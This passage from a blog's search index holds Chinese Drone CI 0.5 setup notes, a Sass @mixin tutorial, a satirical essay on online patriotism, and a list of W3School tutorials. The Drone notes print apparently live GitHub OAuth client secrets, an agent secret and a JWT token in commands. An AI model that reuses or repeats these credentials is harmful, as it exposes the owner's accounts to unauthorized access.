6d4f6973c331ec946ec5844b6ab10b744439bb16\nDRONEVERSION\nDRONEDEPLOYTO\nDRONEPREVBUILDSTATUS failure\nDRONEPREVBUILDNUMBER 12\nDRONEPREVCOMMITSHA   cc53507e583b7c70b63a93c8e2945ee2a3afe6dd\n\n drone 0.5\nEnvironment variables passed to your containers at runtime:\nNAME \tDESC\nCI=drone \tenvironment is drone\nDRONE=true \tenvironment is drone\nDRONEARCH \tenvironment architecture (linux/amd64)\nDRONEREPO \trepository full name                                                yimeng/php-yimeng\nDRONEREPOOWNER \trepository owner                                              yimeng\nDRONEREPONAME \trepository name                                               php-yimeng\nDRONEREPOSCM \trepository scm (git)                      \n${DRONEREPOLINK} \trepository link                                             http://git.yimengapp.com/yimeng/php-yimeng\nDRONEREPOAVATAR \trepository avatar                                           http://git.yimengapp.com/avatars/2\nDRONEREPOBRANCH \trepository default branch (master)                          master\nDRONEREPOPRIVATE \trepository is private                                       true\nDRONEREPOTRUSTED \trepository is trusted                                       true\nDRONEREMOTEURL \trepository clone url\nDRONECOMMITSHA \tcommit sha\nDRONECOMMITREF \tcommit ref\nDRONECOMMITBRANCH \tcommit branch\nDRONECOMMITLINK \tcommit link in remote\nDRONECOMMITMESSAGE \tcommit message\nDRONECOMMITAUTHOR \tcommit author username\nDRONECOMMITAUTHOREMAIL \tcommit author email address\nDRONECOMMITAUTHORAVATAR \tcommit author avatar\nDRONEBUILDNUMBER \tbuild number\nDRONEBUILDEVENT \tbuild event (push, pullrequest, tag)\nDRONEBUILDSTATUS \tbuild status (success, failure)\nDRONEBUILDLINK \tbuild result link\nDRONEBUILDCREATED \tbuild created unix timestamp\nDRONEBUILDSTARTED \tbuild started unix timestamp\nDRONEBUILDFINISHED \tbuild finished unix timestamp\nDRONEPREVBUILDSTATUS \tprior build status\nDRONEPREVBUILDNUMBER \tprior build number\nDRONEPREVCOMMITSHA \tprior build commit sha\nDRONEJOBNUMBER \tjob number\nDRONEJOBSTATUS \tjob status\nDRONEJOBEXITCODE \tjob exit code\nDRONEJOBSTARTED \tjob started\nDRONEJOBFINISHED \tjob finished\nDRONEYAMLSIGNED \tyaml is signed\nDRONEYAMLVERIFIED \tyaml is signed and verified\nDRONEBRANCH \tcommit branch\nDRONECOMMIT \tcommit sha\nDRONETAG \tcommit tag\nDRONEPULLREQUEST \tpull request number\nDRONEDEPLOYTO \tdeployment target (ie production)\nString Interpolation\n\nEnvironment variables are interpolated in the yaml using the ${VARIABLE} syntax, before the yaml is parsed. This is an example yaml file before interpolating environment variable:\n\npipeline:\n  …\n  s3:\n    source: archive.tar.gz\n    target: archive${DRONECOMMIT}.tar.gz\n\nExample after interpolating the environment variable:\n\npipeline:\n  …\n  s3:\n    source: archive.tar.gz\n    target: archive74475490bbad029da60cc96f1b6e6ab68436cb50.tar.gz\n\nString Operations\n\nEnvironment variable interpolation supports emulated bash string operations:\nOPERATION \tDESC\n${param} \tparameter substitution\n\"${param}\" \tparameter substitution with escaping\n${param:pos} \tparameter substitution with substring\n${param:pos:len} \tparameter substitution with substring\n${param=default} \tparameter substitution with default\n${param##prefix} \tparameter substitution with prefix removal\n${param%%suffix} \tparameter substitution with suffix removal\n${param/old/new} \tparameter substitution with find and replace\n\nExample operation to shorten the git sha value:\n\n${DRONECOMMIT:0:8}\n\nExample operation to remove the v from git tag value v1.0.0:\n\n${DRONETAG##v}\n\n启动 server\n   --debug\t\t\t\t\t\t\t\t\t\t\t\tstart the server in debug mode [$DRONEDEBUG]\n   --server-addr \":8000\"\t\t\t\t\tserver address [$DRONESERVERADDR]\n   --server-cert\t\t\t\t\t\t\t\t\tserver ssl cert [$DRONESERVERCERT]\n   --server-key\t\t\t\t\t\t\t\t\t  server ssl key [$DRONESERVERKEY]\n   --admin [--admin option --admin option]\t\t\tlist of admin users [$DRONEADMIN]\n   --orgs [--orgs option --orgs option]\t\t\t\tlist of approved organizations [$DRONEORGS]\n   --open\t\t\t\t\t\t\t\t\t\t\t\t  open user registration [$DRONEOPEN]\n   --yaml \".drone.yml\"\t\t\t\t\t\tbuild configuraton file name [$DRONEYAML]\n   --cache-tty \"15m0s\"\t\t\t\t\t\tcache duration [$DRONECACHETTY]\n   --agent-secret\t\t\t\t\t\t\t\t\tagent secret passcode [$DRONEAGENTSECRET, $DRONESECRET]\n   --driver \"sqlite3\"\t\t\t\t\t\t  database driver [$DRONEDATABASEDRIVER, $DATABASEDRIVER]\n   --datasource \"drone.sqlite\"\t\tdatabase driver configuration string [$DRONEDATABASEDATASOURCE, $DATABASECONFIG]\n   --github\t\t\t\t\t\t\t\t\t\t\t\tgithub driver is enabled [$DRONEGITHUB]\n   --github-server \"https://github.com\"\t\t\t\tgithub server address [$DRONEGITHUBURL]\n   --github-context \"continuous-integration/drone\"\t\tgithub status context [$DRONEGITHUBCONTEXT]\n   --github-client\t\t\t\t\t\t\t\tgithub oauth2 client id [$DRONEGITHUBCLIENT]\n   --github-secret\t\t\t\t\t\t\t\tgithub oauth2 client secret [$DRONEGITHUBSECRET]\n   --github-scope [--github-scope option --github-scope option]\tgithub oauth scope [$DRONEGITHUBSCOPE]\n   --github-git-username \t\t\t\t\tgithub machine user username [$DRONEGITHUBGITUSERNAME]\n   --github-git-password \t\t\t\t\tgithub machine user password [$DRONEGITHUBGITPASSWORD]\n   --github-merge-ref\t\t\t\t\t\t  github pull requests use merge ref [$DRONEGITHUBMERGEREF]\n   --github-private-mode\t\t\t\t\tgithub is running in private mode [$DRONEGITHUBPRIVATEMODE]\n   --github-skip-verify\t\t\t\t\t\tgithub skip ssl verification [$DRONEGITHUBSKIPVERIFY]\n   --gogs\t\t\t\t\t\t\t\t\t\t\t\t  gogs driver is enabled [$DRONEGOGS]\n   --gogs-server \"https://github.com\"\t\t\t\tgogs server address [$DRONEGOGSURL]\n   --gogs-git-username\t\t\t\t\t\tgogs service account username [$DRONEGOGSGITUSERNAME]\n   --gogs-git-password\t\t\t\t\t\tgogs service account password [$DRONEGOGSGITPASSWORD]\n   --gogs-private-mode\t\t\t\t\t\tgogs private mode enabled [$DRONEGOGSPRIVATEMODE]\n   --gogs-skip-verify\t\t\t\t\t\t  gogs skip ssl verification [$DRONEGOGSSKIPVERIFY]\n   --bitbucket\t\t\t\t\t\t\t\t\t\tbitbucket driver is enabled [$DRONEBITBUCKET]\n   --bitbucket-client\t\t\t\t\t\t\tbitbucket oauth2 client id [$DRONEBITBUCKETCLIENT]\n   --bitbucket-secret\t\t\t\t\t\t\tbitbucket oauth2 client secret [$DRONEBITBUCKETSECRET]\n   --gitlab\t\t\t\t\t\t\t\t\t\t\t\tgitlab driver is enabled [$DRONEGITLAB]\n   --gitlab-server \"https://gitlab.com\"\t\t\t\tgitlab server address [$DRONEGITLABURL]\n   --gitlab-client\t\t\t\t\t\t\t\tgitlab oauth2 client id [$DRONEGITLABCLIENT]\n   --gitlab-secret\t\t\t\t\t\t\t\tgitlab oauth2 client secret [$DRONEGITLABSECRET]\n   --gitlab-git-username \t\t\t\t\tgitlab service account username [$DRONEGITLABGITUSERNAME]\n   --gitlab-git-password \t\t\t\t\tgitlab service account password [$DRONEGITLABGITPASSWORD]\n   --gitlab-skip-verify\t\t\t\t\t\tgitlab skip ssl verification [$DRONEGITLABSKIPVERIFY]\n   --gitlab-private-mode\t\t\t\t\tgitlab is running in private mode [$DRONEGITLABPRIVATEMODE]\n   --stash\t\t\t\t\t\t\t\t\t\t\t\tstash driver is enabled [$DRONESTASH]\n   --stash-server\t\t\t\t\t\t\t\t\tstash server address [$DRONESTASHURL]\n   --stash-consumer-key \t\t\t\t\tstash oauth1 consumer key [$DRONESTASHCONSUMERKEY]\n   --stash-consumer-rsa \t\t\t\t\tstash oauth1 private key file [$DRONESTASHCONSUMERRSA]\n   --stash-git-username \t\t\t\t\tstash service account username [$DRONESTASHGITUSERNAME]\n   --stash-git-password \t\t\t\t\tstash service account password [$DRONESTASHGITPASSWORD]\n   --stash-skip-verify\t\t\t\t\t\tstash skip ssl verification [$DRONESTASHSKIPVERIFY]\n\n对比：\nhttps://en.wikipedia.org/wiki/Comparisonofcontinuousintegrationsoftware\n\ndrone 0.5 文档\ndrone 0.5 文档\ndrone demos\n Documentation\nSetup Guide\nBuild Guide\n\ninstall\nSQlite3\napt-get install libsqlite3-dev\nyum install sqlite-devel\ndrone 0.3\nwget downloads.drone.io/master/drone.deb \u0026 dpkg -i drone.deb\n  Created symlink from /etc/systemd/system/multi-user.target.wants/drone.service to /lib/systemd/system/drone.service.\nwget downloads.drone.io/master/drone.rpm \u0026 yum localinstall drone.rpm\n\n config\ndrone --server=192.168.1.106:8000 --token=16239bb0e63719b6f133\ncurl -i 'https://api.github.com/users/whatever?clientid=16239bb0e63719b6f133\u0026clientsecret=f854840a2217af573aaf9cbd7119d445e7ab8806'\n\n运行drone0.5 server\n\n通过drone 命令\ndrone server --server-addr=\":80\" --github --github-client=16239bb0e63719b6f133 --github-secret=f854840a2217af573aaf9cbd7119d445e7ab8806 --agent-secret=16239bb0e63719b6f133 --open\n\nexport DRONESERVER=http://kbook.org\nexport DRONETOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZXh0IjoiMTYyMzliYjBlNjM3MTliNmYxMzMiLCJ0eXBlIjoiYWdlbnQifQ.A4gUVyDDECZDhF429f0fqrZ0pLzL84PgiyK9Td8VKs\ndrone server -s http://kbook.org -t eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZXh0IjoiMTYyMzliYjBlNjM3MTliNmYxMzMiLCJ0eXBlIjoiYWdlbnQifQ.A4gUVyDDECZDhF429f0fqrZ0pLzL84PgiyK9Td8VKs\n通过docker 运行\n\ndocker run -d \\\n  -e DRONEGITHUB=true \\\n  -e DRONEGITHUBCLIENT=... \\\n  -e DRONEGITHUBSECRET=... \\\n  -e DRONESECRET=... \\\n  -e DRONEOPEN=true  \\\n  -e DRONEADMIN=...  \\\n  -v /var/lib/drone:/var/lib/drone \\\n  -p 80:8000 \\\n  --restart=always \\\n  --name=drone \\\n  drone/drone:0.5\n\ndocker run -d --restart=always --name=drone-server -p 80:8000  -v /var/lib/drone:/var/lib/drone -v /var/run/docker.sock:/var/run/docker.sock drone/drone:0.5\n\ndronerc\ndocker run -d --restart=always --name=drone-server -p 80:8000  -v /var/lib/drone:/var/lib/drone -v /var/run/docker.sock:/var/run/docker.sock --env-file dronerc drone/drone","tags":null},{"location":"//blog.pytool.com/Post/前端技术/CSS/2016-03-29 sass揭秘之@mixin-%-@function","title":"sass揭秘之@mixin，%，@function","text":"---\n因为文章内含有很多sass代码，如需自己动手查看编译结果，推荐使用sassmeister这款在线编译工具，方便你阅读学习。\n\n在阅读本文章之前，请先确认你已经阅读了上篇文章sass揭秘之变量，不然会给你带来疑惑的感觉。\n\n其实很多人之所以对sass或less感兴趣，就是因为他们能使用变量和这个@mixin功能，而后面的%和@function知道的人就比较少了。所以说@mixin这个东西还是很有诱惑力的，没办法，广告做得好啊，大明星。这里之所以把%和@function和@mixin放在一起，当然并非无缘无故，一看@mixin和@function就是兄弟，长得那么像，而%这个后起之秀，更是在一定程度上抢了@mixin的不少风头。\n\n这里先说@mixin和%，谁让它们有竞争关系呢，哈哈。@function这个家伙一看就是函数，先闪一边去。 首先@mixin可以传递参数，而%不行；然后@mixin的调用方式是@include，而%的调用方式是@extend；最后@include产生的样式是以复制拷贝的方式存在的，而@extend产生的样式是以组合申明的方式存在的。概念简单讲解完毕，现在进入代码实例，上战场才是真理。\n\n为了方面测试，我们先约定建立一个mixin.scss文件，下面所有的有关@mixin，%和@function的一些定义全部写在这里，再建立一个style.scss来调用我们的mixin.scss文件，所以在style的里面先写上一句@import 'mixin';\n@mixin\n\n先来一段无参数简单版本的@mixin（@mixin，%，@function全部放在mixin.scss文件中）：\n\n// block得有宽度margin左右为auto才能居中\n@mixin center-block {\n  margin-left: auto;\n  margin-right: auto;\n}\n\n这应该是最简单版本的@mixin了，不但没有参数，连样式都只有两条，不过还是很实用的。接下来我们来调用下（调用的全部放在style.scss文件中，先导入mixin文件）：\n\n@import 'mixin';    \nheader{\n    width:1000px;\n    @include center-block;\n}\n.gallery{\n    width:600px;\n    @include center-block;\n}\n\n解析成的css：\n\nheader {\n  width: 1000px;\n  margin-left: auto;\n  margin-right: auto;\n}\n.gallery {\n  width: 600px;\n  margin-left: auto;\n  margin-right: auto;\n}\n\n很显然，上面两个margin左右为auto在各自的选择器中，当然运行是没有问题的，但是如果把这两个一样样式提出来组合申明下多好啊，一看质量就不一样了吗，高端大气上档次了哈哈。这个问题稍后留给我们的%来解决，我们继续@mxixin。\n\n再来个无参数版的，但是包含浏览器兼容方面的：\n\n$lte7:true !default;//是否兼容ie6,7\n\n// inline-block\n// ie6-7 display: inline;zoom:1;\n@mixin inline-block {\n  display: inline-block;\n  @if $lte7 {\n    display: inline;zoom:1;\n  }\n}\n\n上面的代码，有个$lte7全局变量，我们把这个变量提到_mixin.scss文件的最上面。注意这里@mixin里面有个@if判断，这是为ie6,7对inline-block部分不兼容的一个处理，默认$lte7为true，意思是需要兼容ie6,7，那么就会输出判断里面的代码display: inline;zoom:1;，当我们不需要兼容的时候呢，话说高富帅搞的就是搞ie8+的，那设置$lte7为false就没display: inline;zoom:1;这两个家伙的事了，直接宣布其斩立决了。代码为证：\n\n$lte7:false;    \n@import 'mixin';    \n\n.inline-block{\n    @include inline-block;\n}\n\n这里注意：因为我们要重设$lte7为false，所以在@import 'mixin';之前先定义下$lte7:false;，这涉及到变量默认值的使用，如果你不了解请先查阅sass揭秘之变量\n\n解析成的css：\n\n.inline-block{\n    display:inline-block;\n}\n\n当然如果没有$lte7:false;这个提前申明变量，那么解析成的css应该是这样的：\n\n.inline-block{\n    display:inline-block;\n    display: inline;zoom:1;\n}\n\n从上面可以看出，如果@mixin里面放点判断，对浏览器的兼容还可以做点有意义的事，不用每次都写一大坨，同时还为以后升级带来一个暗门，直接改变下变量的值重新解析下就ok了，那些为兼容处理的代码统统消失，这比较爽。测试完这个之后，请把$lte7:false;删掉，因为后面还要用到其值true。\n\n现在来个参数简单版的：\n\n@mixin float($float:left) {\n  float: $float;\n  @if $lte7 {\n    display: inline;\n  }\n}\n\n够简单吧，float人人皆知啊。这里$float参数有默认值为left，我们调用下：\n\n.fl{\n    @include float;\n}\n.fr{\n    @include float(right);\n}\n\n解析成的css：\n\n.fl{\n    float:left;\n    display: inline;\n}\n.fr{\n    float:right;\n    display: inline;\n}\n\n因为在传参数的时候$float设置了一个默认值为left，所以调用的时候@include float;和@include float(left);能产生一样的代码。这里先说下我琢磨出来的一个经验，如果某个@mixin无法设置默认的参数，那么这个@mixin要么可以用%来取代，要么就是个鸡肋@mixin，所以请定义@mixin的时候参考这两点判断是否有必要，特殊情况除外。\n\n关于鸡肋@mixin等下再说，我们接着说下多个参数的@mixin：\n\n// 禁用样式，加!important\n@mixin disabled($bgColor:#e6e6e6,$textColor:#ababab){\n  background-color: $bgColor !important;\n  color: $textColor !important;\n  cursor: not-allowed !important;\n}\n\n两个参数，一个为背景色，一个为文本色，两个冒号后面的分别为默认值，直接调用@include diasbled;使用的就是默认值，虽然简单，我们还是调用下吧。\n\n.disabled{\n    @include disabled;\n}\n\n解析后的css：\n\n.disabled {\n  background-color: #e6e6e6 !important;\n  color: #ababab !important;\n  cursor: not-allowed !important;\n}\n\n接着下一个实例，一个属性可以有多个属性值的，写到这里，看过sass揭秘之变量的人就想起来了，原来是传参的时候变量得加...:\n\n//错误定义方法\n@mixin box-shadow($shadow){\n    -webkit-box-shadow:$shadow;\n    -moz-box-shadow:$shadow;\n    box-shadow:$shadow;\n}\n\n为了给人说明这...，有必要先搞个错误的东西，那样你就会恍然大悟了。我们来调用下上面的错误定义方法：\n\n.shadow1{\n    @include box-shadow(0 0 5px rgba(0,0,0,.3));//这个可以运行\n}\n.shadow2{\n    @include box-shadow(0 0 5px rgba(0,0,0,.3),inset 0 0 3px rgba(255,255,255,.5));//这个不可运行\n}\n\n上面两个代码，我们先运行第一个，会成功解析出css，而第二个就不行了，它就是孙猴子派来捣乱的。\n\n第一个运行解析成的css为：\n\n.shadow1{\n    -webkit-box-shadow:0 0 5px rgba(0,0,0,.3);\n    -moz-box-shadow:0 0 5px rgba(0,0,0,.3);     \n    box-shadow:0 0 5px rgba(0,0,0,.3);  \n}\n\n为什么第二个不行呢，因为第二个我们给box-shadow设置了两个值，一个外阴影一个内阴影，并且是以，分开的。实际情况是，我们对box-shadow可以设置很多个值，随我们高兴，没有一定的。这个时候就有了为css3这些妖孽而生的传递的参数后面加...了，上代码：\n\n//正确定义方法\n@mixin box-shadow($shadow...){\n    -webkit-box-shadow:$shadow;\n    -moz-box-shadow:$shadow;\n    box-shadow:$shadow;\n}\n\n正确的东西得来总是那么不容易，话说一开始研究别人代码的时候，还以为这...是随便加上去好玩的呢。然后我写css3的@mixin的时候把...统统去掉，结果，结果就悲剧了，可以有多个属性值的，只能设置一个属性值，然后就是满天找bug了。注意这里只在传参的时候变量后面添加...，而在大括号内引用的时候是不用加...，接着你可以回过头测试下上面那两个代码了，保准ok！\n\n看完...这个为css3而生的之后，我们再看一个为css3而成的东西@content，之所以提起来，是因为它也是应用在@mixin里面的。按常规来说，我们所有的样式都是在@mixin里面定义好的，然后使用的时候@include就拷贝了这段样式，但是@content改变了这一惯例，它其实没有定义样式，它是定义好了选择器，然后@include的时候，就是选择器定了，你写的样式都放在这个选择器里面。光文字介绍是不能解决问题的，还是实例比较有营养：\n\n@mixin header{\n    #header{\n        @content;\n    }\n}\n\n我们来简单调用下：\n\n@include header{\n    width:1000px;\n    height:200px;\n    .logo{\n        width:200px;\n    }\n}\n\n解析后的css：\n\nheader {\n  width: 1000px;\n  height: 200px;\n}\nheader .logo {\n  width: 200px;\n}\n\n看到没，这个选择器以#header为基础，然后@include header里面写的任何样式，都是在这个基础上的。明白@content与上面的其他的区别不，其他的@mixin调用的时候是这样的@include mixin-name($var1,$var2,...,$varn)，而这个@content的调用的时候是这样的@include mixin-name{},大括号里面就是@content表示的内容，里面css样式随便你写啊。\n\n当然上面的@content实例是闲得蛋疼的为简单说明而写的，其实没有什么使用价值的，@content的使用价值其实体现在css3的media-queries，animation的keyframes定义，还有为浏览器兼容的定义。下面实例说明：\n\n//定义media-queries的最小最大宽度\n@mixin screen($res-min, $res-max){\n  @media screen and ( min-width: $res-min ) and ( max-width: $res-max ){\n    @content;\n  }\n}\n\n//定义animation的keyframes\n@mixin keyframes($name){\n    @keyframes #{$name} {\n      @content;\n    }\n}\n\n//定义所有不支持圆角的浏览器使用背景图片\n//得使用modernizr来检测，在html上加class\n@mixin no-border-radius{\n    .no-border-radius{\n        @content\n    }\n}\n\n又到调用这步了，没办法，不验证下，产生点css，还是有点迷惑：\n\nheader{\n    @include screen(780px,1000px){\n        color:red;\n    }\n}\n\n@include screen(780px,1000px){\n    body{\n        font-size:14px;\n    }\n}\n\n@include keyframes(show){\n    0% {\n        opacity:0;\n    }\n    100% {\n        opacity:1;\n    }\n}\n\n//注意下面这两个的区别\n@include no-border-radius{\n    .box{\n        background:url(round-bg.gif) no-repeat;\n    }\n}\n.box{\n    @include no-border-radius{\n        background:url(round-bg.gif) no-repeat;\n    }\n}\n\n解析后的css：\n\n@media screen and (min-width: 780px) and (max-width: 1000px) {\n  header {\n    color: red;\n  }\n}\n@media screen and (min-width: 780px) and (max-width: 1000px) {\n  body {\n    font-size: 14px;\n  }\n}\n@keyframes show {\n  0% {\n    opacity: 0;\n  }\n\n  100% {\n    opacity: 1;\n  }\n}\n.no-border-radius .box {\n  background: url(round-bg.gif) no-repeat;\n}\n.box .no-border-radius {\n  background: url(round-bg.gif) no-repeat;\n}\n\n上面那个@include screen我们使用了两种方法去调用，第一种在选择器里面调用，第二种直接调用，两者生成的css是一样的，既然生成的样式没有什么区别，那如何使用呢？其实第一种方式强调的是以选择器为主，当screen是什么时候是什么值，而第二种调用方法强调以media-queries条件为主，可以方便组织所有在这个条件中的都写在一起。如果做响应式布局我们建议使用第二种方法，以断点为主来写样式，把某个断点下的样式全部写在一起。\n\n为了表示media-queries的特殊，我们举了个反例，同样以两种方法调用@include no-border-radius，结果可以看到完全不一样啊，大家千万别以为是@include no-border-radius错了，其实它才是正确的。而media-queries是个为了大家方便使用的特殊案例。\n\n@mixin说到这里，其主要的知识点也说完了，相信大家也收获不少了，为了表示对@mixin的敬意，我再挑几个@mixin来分析。\n\n先来个我们常用的用border生成三角形的@mixin:\n\n// triangle\n@mixin triangle($direction, $size, $borderColor ) {\n  content:\"\";\n  height: 0;\n  width: 0;\n\n  @if $direction == top {\n    border-bottom:$size solid $borderColor;\n    border-left:$size dashed transparent;\n    border-right:$size dashed transparent;\n  }\n  @else if $direction == right {\n    border-left:$size solid $borderColor;\n    border-top:$size dashed transparent;\n    border-bottom:$size dashed transparent;\n  }\n  @else if $direction == bottom {\n    border-top:$size solid $borderColor;\n    border-left:$size dashed transparent;\n    border-right:$size dashed transparent;\n  }\n  @else if $direction == left {\n    border-right:$size solid $borderColor;\n    border-top:$size dashed transparent;\n    border-bottom:$size dashed transparent;\n  }\n}\n\n这个@mixin主要有三个变量：第一个是方向的，因为三角形根据箭头朝向有四种方向，我们对应常用的css属性top,right,bottom,left；第二个表示三角形的大小；第三个表示颜色。当然你可以挑你常用的那个设置为变量的默认值，那样调用常用的那个就比较简单了，直接@include triangle;就ok了。\n\n下面我们再来个关于css3的神来之笔的@mixin，在说这个之前，先说下前面的那个box-shadow的@mixin，我们里面的样式是一条一条写的，如-webkit-box-shadow:$shadow;-moz-box-shadow:$shadow;box-shadow:$shadow;，这得多山炮啊，一条一条来，不简洁，不科学。下面欢迎我们的prefixer这个@mixin，它对css3的前缀定义有画龙点睛之妙。\n\n//是否支持某个浏览器的前缀，如果你不想支持，可以设置为false\n//","tags":null},{"location":"//blog.pytool.com/Life/2016-03-23 大家都在演戏，就你当真了","title":"大家都在演戏，就你当真了","text":"天亮了，又是一个工作日，很多上班族都要早早起床去挤公交车，因为他们并没有收到老板的短信：昨天参与讨论南海问题辛苦了，今天放你半天假。很明显，老板眼里只有钱，而没有民族大义，你眼里只有民族大义，而没有钱，这个不难理解，毕竟赚钱这件事更难一些，而民族大义只需要转发一下朋友圈。没错，我是在讽刺你们这些口炮爱国者，真正关心南海问题的爱国者是不会睡觉的，更不会在乎第二天还要上班打卡这种事。自古以来，我就看不起那些嚷着“打台湾我捐一个月工资，打美国我捐一年工资”的人，毕竟你的工资太低了，低到都不够很多官员吃一顿饭的。要爱国，先要提高自己的收入，不然我都替你不好意思，或许你很真诚，但是显得自己很愚蠢。\n\n你只有在愚蠢的时候才是真诚的，这话不是我说的，是米兰·昆德拉说的，他还说过“他们只有在安全的时候才是勇敢的，在免费的时候才是慷慨的，在浅薄的时候才是动情的”，这些话很符合当下一些人的形象：对遥远的美帝说开战，金戈铁马，气吞万里如虎，却对身边的罪恶视而不见，听而不闻；慷他人之慨，没钱假大方，流氓假仗义；高谈爱国，却无人爱你，情绪激昂热泪盈眶，却不知何为爱国，典型的“国不知有民，民不知有国。”，在《甲午》里，梁启超有番话是这么说的，“李中堂知有洋务而不知有国务，知有兵事而不知有民政，知有外交而不知有内治，知有朝廷而不知有国民，不知国家之为何物。不知国家与政府有若何之关系，不知政府与人民有若何之权限……”，所以说，在关系尚未搞清楚之前，我是不建议谈情说爱的。\n\n很多人期盼中美一战，坚信中美必有一战，我相信你是真诚的，但正是这种真诚说明你真的很蠢，在电影《阳光灿烂的日子里》，年幼的马小军有段内心独白：“我最大的幻想便是中苏开战，因为我坚信，我军的铁拳定会把苏美两军的战争机器砸的粉碎，一位举世瞩目的战争英雄将由此诞生，那就是我！”，你犯的就是这个幼稚病，你并没有感受过战争带来的分别、离别、永别，你热爱战争的唯一原因是没参加过战争以及你以为你不用参加这场战争。马小军对于打架说过这么一段话，“我发现了一个规律，几个人十几个人的遭遇战打得最惨，也常出人命，几十人上百人的架却往往打不起来，因为人勾来得越多就越容易勾来熟人，甚至两拨都去勾来同一拨人。”，打架跟打仗不同，但有些道理是相通的，阵势越大越打不起来，参与者越多利益勾连越紧密，往往也打不起来，中国政府也已经公开声明了：“中国愿同有关直接当事国尽一切努力作出实际性的临时安排，包括在相关海域进行共同开发，实现互利共赢，共同维护南海和平稳定。”，再说，那么多高官显贵的子女都在美国，还有很多人是美国人的爹，怎么可能打得起来呢？日常生活里你的脑子到底遭受了什么虐待，为什么非要在自己的朋友圈显得自己很愚蠢呢？\n\n每次遇到国际纠纷，两国政府刚摆好阵势还没上演戏码，围观的群众就按耐不住了，每次都有那么一帮人站出来高喊那句熟悉的座右铭：“犯我强汉者，虽远必诛”，但很多人的表现把这话演绎成了“犯我强汉者，虽远必猪”，过过嘴瘾而已，这话出自西汉名将陈汤给汉元帝的上书，是表明击退北匈奴郅支单于的功绩，全句为：“宜悬头槀街蛮夷邸间，以示万里。明犯强汉者，虽远必诛！”，意思就是应该把砍下的头悬挂在蛮夷居住的槀街，让他们知道，敢于侵犯强大汉帝国的人，即使再远，我们也一定要杀掉他们。现在却被演绎成“你们要是敢于侵犯强大的中华人民共和国，即使再远，我们也一定要骂你们是猪”，我是不相信这些人有什么勇气的，还不如下面这些人有骨气，“我们从点滴做起，不买日系车，不买苹果手机，不吃肯德基，不买菲律宾香蕉等等敌对国家产品，支持敌人就是对国家和民族犯罪！经济制裁鬼子们从我做起，人人有责！功德无量！”，当然，他们的骨气也是建立在买不起和优惠不够的基础上的，买日系车送四次保养、苹果新款手机限时八折、肯德基买一个汉堡送一根薯条之类的活动，都会动摇他们的骨气，此外，你们怎么不去抵制互联网啊，美国人发明的。每次都用这一套，能不能用点心换换花样。\n\n很多爱国青年并不能理解这些嘲讽，他们甚至感觉委屈，有些还会飙泪怒斥：你们还是中国人吗？年轻人，其实大家都在演戏，就你当真了。这种事不仅有写好的剧本，还有导演、主演，而你们算是群演，为了让你们的表演更逼真，剧组就没告诉你们真相，当然也省了盒饭钱和群演费，这还不是最让你伤心的，伤害你爱国感情的是有些人趁机在军工概念股上发了一笔财，也就是说在你自费爱国时，有人挣钱了，挣钱的不仅仅是个人，还有其他国家政府，外交部发言人陆慷说，“仅仅以7月份为例，不到10天，除柬埔寨外，就有安哥拉、利比里亚、马达加斯加、巴布亚新几内亚、塞内加尔这些国家表达了对中方南海立场的理解和支持。”，看来我们的援助没有白费，而且这些援助花的钱里，也有你的一份。我的意思是，你可以爱国，但别显得自己很蠢，毕竟在国际上影响不好，你没钱没时间没机会出国丢人，但别人还是有条件出去的。\n\n关于南海问题，北京白云观官方微博发了一条曹信义道长的话：“我们道教徒是热爱和平的，但是如果明天侵略者来犯，道教徒同样一手拿枪一手拿香，把敌人赶出家乡，保卫家国。”，曹道长，这国是禁枪的你知道吗？我觉得还是用各自擅长的方式爱国比较好，你们最擅长的是看风水，去年美国负责东亚事务的助理国务卿在接受电话采访时说，“中国填海造岛不一定违反国际公约，但必然会破坏东南亚地区的风水、和谐。”，那时你的同门，中国道教龙门派三十代玄裔弟子全真道士梁兴扬就严正抗议：“贫道深感忧虑，建议有关部门严格执行《对美高端玄学技术及精密风水道具出口管制条例》，附《论中国南海造岛对地球风水及太阳系和平的正面影响》。”，意在提醒美国，风水这东西，我们道教都还没说话呢，你们不懂别乱说。在错综复杂的国内形势下，爱国还是要从专业角度出发，总比拿刀拿枪好，也显得自己没那么愚蠢。\n\n凡事都要讲个逻辑，爱国也一样，我不是反对你们爱国，我是反对你们没逻辑，逻辑你们懂吗？九叶派诗人辛笛在半个世纪前写下的讽刺诗《“逻辑”》：“对有武器的人说／放下你的武器学做良民／因为我要和平；对有思想的人说／丢掉你的思想像倒垃圾／否则我有武器……”，没有无缘无故的爱，也没有无缘无故的恨，目前你们的爱和恨，都很无缘无故。","tags":null},{"location":"//blog.pytool.com/Post/Awesome/2016-03-23 W3School-教程整理","title":"W3School 教程整理","text":"交互设计\n前端教程合集\n\n在线浏览\n  AngularJS教程\n  Bootstrap教程\n  CSS参考手册\n  Foundation 教程\n  Highcharts 教程\n  HTML教程\n  CSS教程\n  Firebug教程\n  HTML参考手册\n  JavaScript教程\n  HTML DOM教程\n  JavaScript高级教程\n  jQuery教程\n  Ajax教程\n  Google地图教程\n  jQuery UI教程\n  jQuery Easy UI教程\n  jQuery参考手册\nPDF格式\nEPUB格式\nMOBI格式\n\n 后端教程合集\n\n在线浏览\n  C#教程\n  ASP.net教程\n  C++教程\n  C语言教程\n  django教程\n  Go语言 教程\n  Java教程\n  JSP教程\n  Servlet教程\n  Linux教程\n  Lua 教程\n  Node.js教程\n  PHP教程\n  PHP参考手册\n  Python教程\n  Python3教程\n  Ruby教程\n  Scala 教程\n  设计模式教程\n  正则表达式教程\nPDF格式\nEPUB格式\nMOBI格式\n\n移动端教程合集\n\n在线浏览\n  Ionic 教程\n  ios教程\n  jQueryMobile教程\n  Swift 教程\nPDF格式\nEPUB格式\nMOBI格式\n\n 数据库教程合集\n\n在线浏览\n  Memcached 教程\n  MongoDB教程\n  Redis教程\n  SQL教程\n  MySQL教程\n  SQLite教程\nPDF格式\nEPUB格式\nMOBI格式\n\nAndroid 基础入门教程\n\n在线浏览\n  Android 基础入门教程\nPDF格式\nEPUB格式\nMOBI格式\n\n Eclipse 教程\n\n在线浏览\n  Eclipse教程\nPDF格式\nEPUB格式\nMOBI格式\n\ngit教程\n\n在线浏览\n  git教程\n\n JavaScript参考手册\n\n在线浏览\n  JavaScript参考手册\nPDF版（2014.10.3）\n  CSDN下载\n  51CTO下载\n  微盘下载\n  百度云下载\n\nVBS \u0026amp; ASP教程\n\n在线浏览\n  VBS教程\n  ASP教程\n  ADO教程\nPDF版（2014.9.30）\n  